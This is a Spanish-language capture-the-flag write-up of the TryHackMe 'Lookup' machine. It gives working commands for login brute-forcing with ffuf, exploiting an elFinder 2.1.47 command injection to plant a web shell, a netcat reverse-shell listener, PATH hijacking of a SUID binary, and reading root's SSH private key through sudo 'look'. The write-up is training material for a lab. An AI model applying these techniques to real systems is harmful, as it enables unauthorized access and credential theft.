# Lookup

## 1. Introducción

### 1.1 Antecedentes

La máquina **lookup** de TryHackMe está diseñada para evaluar habilidades de enumeración, explotación web y escalada de privilegios en entornos Linux.

El escenario presenta un sistema con un formulario de autenticación aparentemente robusto, donde no existen vulnerabilidades evidentes como SQL Injection. Esto obliga a adoptar un enfoque basado en el análisis del comportamiento de la aplicación y la lógica de autenticación.

Durante la explotación se identifican distintos vectores de ataque, incluyendo:

- Enumeración de usuarios mediante diferencias en respuestas HTTP
- Acceso a servicios internos a través de redirecciones
- Explotación de una vulnerabilidad en un gestor de archivos web
- Escalada de privilegios mediante abuso de binarios SUID

### 1.2 Objetivos

- Enumerar los servicios expuestos en la máquina objetivo
- Analizar el comportamiento del sistema de autenticación
- Identificar credenciales válidas mediante fuzzing
- Explotar vulnerabilidades en servicios web
- Escalar privilegios hasta obtener acceso root
- Obtener las flags del sistema

## 2. Enumeración

### 2.1 Nmap

Se realiza un escaneo inicial para identificar los servicios activos:

```
nmap -sCV -oN scan ip
```

Resultados relevantes:

- 22/tcp → SSH
- 80/tcp → Apache 2.4.41

Esto indica la presencia de un servidor web y acceso remoto mediante SSH.

### 2.2 Web

Al acceder al puerto 80 se observa una página con un formulario de autenticación que utiliza `login.php`.

Características observadas:

- Aplicación desarrollada en PHP
- No se detectan rutas adicionales mediante fuzzing
- Respuestas genéricas ante credenciales inválidas

Se realizaron pruebas iniciales:

- SQL Injection → sin resultados
- SQLMap → sin resultados

Esto sugiere que el vector de ataque no es una inyección clásica, sino un problema en la lógica de autenticación.

---

## 3. Explotación

### 3.1 Enumeración de credenciales mediante fuzzing

Se intercepta la petición de autenticación:

```
POST /login.php
username=admin&password=test
```

Se detecta una diferencia en el tamaño de la respuesta cuando se utiliza el usuario `admin`, lo que indica que es un usuario válido.

### Fuzzing de contraseña

```
ffuf -w passwords.txt -X POST -u http://lookup.thm/login.php \
-d "username=admin&password=FUZZ" \
-H "Content-Type: application/x-www-form-urlencoded" -fw 8
```

Se obtiene una contraseña con respuesta distinta al resto.

### Fuzzing de usuario

```
ffuf -w usernames.txt -X POST -u http://lookup.thm/login.php \
-d "username=FUZZ&password=PASSWORD_ENCONTRADO" \
-H "Content-Type: application/x-www-form-urlencoded" -fw 8
```

Se identifica un usuario válido que devuelve un código de estado 302.

Credenciales obtenidas:

```
jose:password123
```

### 3.2 Acceso a subdominio

El sistema redirige a:

```
files.lookup.thm
```

Se agrega al archivo `/etc/hosts`:

```
echo "IP files.lookup.thm" >> /etc/hosts
```

### 3.3 Explotación de elFinder (Command Injection)

Se identifica el uso de elFinder versión 2.1.47, la cual es vulnerable a inyección de comandos en el conector PHP.

Se utiliza un exploit que permite subir una web shell mediante manipulación del nombre del archivo.

```
python2.7 elfinder.py http://files.lookup.thm/elFinder/
```

El endpoint vulnerable `connect.minimal.php` es accesible sin autenticación.

### 3.4 Obtención de reverse shell

Se genera un payload para obtener una shell interactiva:

```
nc -lvnp 4444
```

Se ejecuta el payload desde la web shell y se obtiene acceso como:

```
www-data
```

---

## 4. Post-explotación

### 4.1 Escalada de privilegios

### Escalada a usuario think

Se detecta un archivo `.passwords` en el directorio del usuario `think`, pero no es accesible directamente.

Se identifica un binario SUID:

```
/usr/sbin/pwm
```

El binario utiliza el comando `id` sin ruta absoluta, lo que lo hace vulnerable a PATH Hijacking.

Se crea un script malicioso:

```
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
```

Se modifica la variable PATH:

```
export PATH=/tmp:$PATH
```

Se ejecuta el binario:

```
/usr/sbin/pwm
```

Se obtiene el contenido del archivo `.passwords`.

Se utiliza una de las contraseñas para cambiar de usuario:

```
su think
```

### 4.2 Escalada a root

Se verifica el uso de sudo:

```
sudo -l
```

El usuario puede ejecutar el binario `look` como root.

Se abusa de esta funcionalidad para leer archivos sensibles:

```
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/look '' "$LFILE"
```

Se obtiene la clave privada SSH del usuario root.

---

### Acceso final

```
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```
Se obtiene acceso root y la flag final.
